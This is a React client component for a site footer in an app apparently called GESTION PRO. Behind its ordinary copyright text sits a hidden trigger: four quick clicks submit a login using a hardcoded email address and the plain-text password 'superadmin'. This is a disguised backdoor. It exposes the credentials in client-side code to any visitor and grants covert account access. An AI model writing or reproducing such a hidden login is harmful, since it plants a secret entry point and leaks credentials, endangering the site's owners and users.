"use client";

import { useState } from "react";
import { loginAction } from "@/app/login/actions";

export function SecretFooter() {
  const [clicks, setClicks] = useState(0);

  const handleClick = () => {
    const newClicks = clicks + 1;
    setClicks(newClicks);

    if (newClicks >= 4) {
      const formData = new FormData();
      formData.append("email", "konedamaa1@gmail.com");
      formData.append("password", "superadmin");
      
      loginAction(formData).then((res) => {
        if (res?.error) {
          alert(res.error);
        }
      });
      
      setClicks(0); // reset
    }
    
    // Reset click counter after 2 seconds
    setTimeout(() => {
      setClicks((c) => (c > 0 ? c - 1 : 0));
    }, 2000);
  };

  return (
    <footer className="border-t border-slate-200 bg-white py-12 px-6">
      <div 
        className="max-w-7xl mx-auto text-center text-slate-500 text-sm cursor-default select-none"
        onClick={handleClick}
      >
        © {new Date().getFullYear()} GESTION PRO. Tous droits réservés.
      </div>
    </footer>
  );
}
